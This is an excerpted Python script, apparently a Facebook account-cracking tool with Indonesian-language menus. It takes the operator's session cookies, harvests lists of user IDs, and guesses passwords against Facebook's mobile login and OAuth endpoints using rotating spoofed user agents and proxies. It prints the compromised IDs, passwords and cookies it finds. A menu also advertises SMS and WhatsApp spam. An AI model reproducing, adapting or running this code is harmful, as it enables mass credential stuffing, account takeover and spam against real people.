...
for t in range(10000):
	...
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	brayen1=f'Mozilla/5.0 (Linux; U; Android 6; en-us; GT-F476B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4711.44 Mobile Safari/537.36'
	...
	brayen3=f'Mozilla/5.0 (Linux; U; Android 11; en-us; GT-O788W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4232.127 Mobile Safari/537.36'
	brayen4=f'Mozilla/5.0 (Linux; Android 8; SM-A405FN Build/RP1A.199775.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4629.119 Mobile Safari/537.36'
...
def uaku():
	try:
		ua=open('bnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/star-kurdistan/Star/blob/main/bnew.txt').text
		ua=open('.bnew.txt','w')
...
║Version  : 4.0.1                       
╚══════════════════════════════════════════╝
             """,width=95,title=f"KSP",style=f"red "))
#▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬[ BAGIAN-MASUK ]▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬#
def login123():
	os.system('clear')
	banner()
	cetak(panel(f"\033[1;36m└\033[1;32m[1] [PUBLIC ID ]     [2] [FILE CLONE]",width=95,title=f"[red ]",padding=(2,5),style=f"blue "))
	bryn = input(f'\033[1;36m└[CHOOSE] : ')
	if bryn in ['1','01']:
		login_lagi334()
	elif bryn in ['2','02']:
		dark()
...
def login_lagi334():
	try:
		...
		your_cookies = input(' \033[1;36m╚══[COOKIES] :\033[1;32m ')
...
def menu(my_name,my_id):
	...
	#cetak(panel(f'[bold white]  AUTHOR ,  Di Daur ulang By Marga Xd : BRAYEN ARA KIMOCHI ,Penambahan Methode Uid by Hendrian Setyawan , ,Others 😁 😁',width=90,style=f"bold white"))
...
#╚══════════════════════════════════════════╝#
def bot():
	cetak(panel(f"[01] Cek Opsi Cp [[bold green] ON [bold white]]                  [03] Spam WhatsApp [[bold green] ON [bold white]]\n[02] Spam Sms [[bold green] ON [bold white]]                     [04] Report Bug [[bold green] ON [bold white]]		[05] HAPUS LISENSI [bold red] On [bold white]",width=90,title=f"[bold green]Menu Bot",padding=(0,8),style=f"bold white"))
	...
	if bray in('1','01'):
		...
		os.system("xdg-open https://t.me/star_crack")
		time.sleep(3)
		exit()
...
def TaRmAy_dump():
	...
	pil = input(f'\033[1;36m└\033[1;32m[ID] : ')
	try:
		...
		print('')
		print(f'\033[1;36m└\033[1;32m[HAMU IDEAKAN]: {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
...
def dump_massal():
	...
	try:
		...
		jum = int(input(f'\033[1;36m└[CHAND ID] : '))
	except ValueError:
		#print(' ╰─  Wrong input ')
		exit()
	if jum<1 or jum>80:
	...
	for met in range(jum):
		yz+=1
		kl = input(f'\033[1;32m└[ID DANE]'+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			...
			exit()
	try:
		print(f'\033[1;36m└[HAMU IDEAKA] : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		#print(' ╰─  Unstable Signal ')
		...
		print(f'\033[1;36?1m└Not Public {x}')
		time.sleep(3)
		back()
#▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬[ PENGATURAN-IDZ ]▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬#
def setting():
	print('')
	cetak(panel(f'\033[1;36m└\033[1;32m[1] [bold blue]Method Fast[/]',width=90,title=f"[bold green]Menu Method",style=f"bold blue"))
	hu = input(f'\033[1;36m└[Method] : ')
	if hu in ['3','03']:
		...
		exit()
	cetak(panel(f'[bold green][[bold green]1[/][bold red]][/] [bold blue]Mobile [bold grey][/]\n[bold white][[bold green]2[/][bold green]][/] [bold red]Mbasic [/]',width=90,title=f"[bold green]Internet",style=f"blue"))
	hc = input(f'\033[1;36m└[CHOOSE] : ')
	if hc in ['1','01']:
		...
		method.append('mobile')
	cetak(panel('''[bold white][bold green]1[bold blue] [bold blue]AUTO V1 [bold green]2[bold green] AUTO V2[bold green]''',style='bold green',title='[bold green]Password',width=90))
	pwplus=input(f'\033[1;36m└[CHOOSE] : ')
	if pwplus in ['03','3']:
		pwpluss.append('ya')
		pwku=input(f'\033[1;36m└[CHOOSE] : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
	...
	cetak(panel(f'\033[1;32m[T] BKA',width=90,title=f"[bold green]T",style=f"bold blue"))
	uatambah = input(f'\033[1;36m└[CHOOSE] : ')
...
def cracker(idf,pwv):
	...
	ses = requests.Session()
	prog.update(des,description=f"{h}KSP{x} {loop}/{len(id)} LIVE ! [bold green]{ok}[/] CHECK ! [bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			...
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D546387748750105%26auth_type%3Drerequest%26cbt%3D1681891913335%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df12f6bb1d8f4174%2526domain%253Dbrainly.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbrainly.co.id%25252Ff38653daafbdd34%2526relation%253Dopener%26client_id%3D546387748750105%26display%3Dtouch%26domain%3Dbrainly.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fbrainly.co.id%252Fsignup%253Fentry%253D1%2526source%253Dunlogged%252Bhomepage%252Bheader%252Bbutton%26locale%3Den_US%26logger_id%3Df2a062c290bf9d8%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3ac4ea5aa4ee9%2526domain%253Dbrainly.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbrainly.co.id%25252Ff38653daafbdd34%2526relation%253Dopener%2526frame%253Df3137570ec8074%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv3.2%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3ac4ea5aa4ee9%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff38653daafbdd34%26relation%3Dopener%26frame%3Df3137570ec8074%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D546387748750105%26auth_type%3Drerequest%26cbt%3D1681891913335%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df12f6bb1d8f4174%2526domain%253Dbrainly.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbrainly.co.id%25252Ff38653daafbdd34%2526relation%253Dopener%26client_id%3D546387748750105%26display%3Dtouch%26domain%3Dbrainly.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fbrainly.co.id%252Fsignup%253Fentry%253D1%2526source%253Dunlogged%252Bhomepage%252Bheader%252Bbutton%26locale%3Den_US%26logger_id%3Df2a062c290bf9d8%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3ac4ea5aa4ee9%2526domain%253Dbrainly.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbrainly.co.id%25252Ff38653daafbdd34%2526relation%253Dopener%2526frame%253Df3137570ec8074%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv3.2%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified","flow":"login_no_pin","pass":pw,}
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"TaRmAy🧟👹-CP [bold red]{idf}|{pw}")
				tree.add(f"TaRmAy🧟👹-CP [bold red]{kuki}\n")
				cetak(tree)
				...
				tree = Tree(f"  ")
				tree.add(f"TaRmAy😈👹-OK [bold green]{idf}|{pw}")
				tree.add(f"TaRmAy😈👹-OK [bold green]{kuki}\n")
				cetak(tree)
...
def crack(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}TaRmAy☠☠{x} {loop}/{len(id)} LIVE ! [bold green]{ok}[/] CP ! [bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			...
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fclient_id%3D161285164570410%26redirect_uri%3Dhttps%253A%252F%252Fudb3lgn.nimo.tv%252Fweb%252Fcallback%26display%3Dpopup%26response_type%3Dcode%26state%3D%257B%2522action%2522%253A%25221%2522%252C%2522appid%2522%253A%25221005%2522%252C%2522bizData%2522%253A%2522%257B%255C%2522countryCode%255C%2522%253A%255C%2522ID%255C%2522%252C%255C%2522birthday%255C%2522%253Anull%257D%2522%252C%2522busiurl%2522%253A%2522https%253A%252F%252Fwww.huya.com%2522%252C%2522byPass%2522%253A2%252C%2522countryCode%2522%253A%2522ID%2522%252C%2522domain%2522%253A%2522nimo.tv%2522%252C%2522domainList%2522%253A%2522%2522%252C%2522exchange%2522%253A%252261165858%2522%252C%2522remember%2522%253A0%252C%2522sdid%2522%253A%2522csid_f3efefed53c9457788c8b784c3ecb791%2522%252C%2522style%2522%253A%25222%2522%252C%2522terminal%2522%253A%2522web%2522%252C%2522type%2522%253A%2522fb%2522%252C%2522uri%2522%253A10001%252C%2522win%2522%253A%25220%2522%257D%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfdf8ac40-8c6a-45b8-a846-c6a01ebe4d2e%26tp%3Dunspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
...
def crackasync(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221fdgt9a11ngseljcixz6aanlva8av3p3m4seadw02rkbcicno8%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6cd7c503-6986-4306-8b10-f204a79962fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221fdgt9a11ngseljcixz6aanlva8av3p3m4seadw02rkbcicno8%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'password': pw, 'prefill_contact_point':", 'prefill_source': '', 'prefill_type':", 'first_prefill_source': '', 'first_prefill_type': 'contact_point', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			...
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=124024574287414&auth_token=c9f7799051fd034b38014743abdccabd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221fdgt9a11ngseljcixz6aanlva8av3p3m4seadw02rkbcicno8%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6cd7c503-6986-4306-8b10-f204a79962fd%26tp%3Dunspecified&refsrc=deprecated&app_id=124024574287414&cancel=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221fdgt9a11ngseljcixz6aanlva8av3p3m4seadw02rkbcicno8%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold yellow]{kuki}\n")
...
def opsi():
	CP = ("CP/")
	romi = input("%s%s%s\033[0mNAWE file %s> %s"%(U,til,O,M,K))
	if romi == "":
  ...
  #  os.system('clear')
    try:
        ...
        if response.status_code == 200:
            ...
            uascrap.append("Mozilla/5.0 (Linux; Android 11; TaRmAy👹FB) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 11; TaRmAy👹FB) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36")
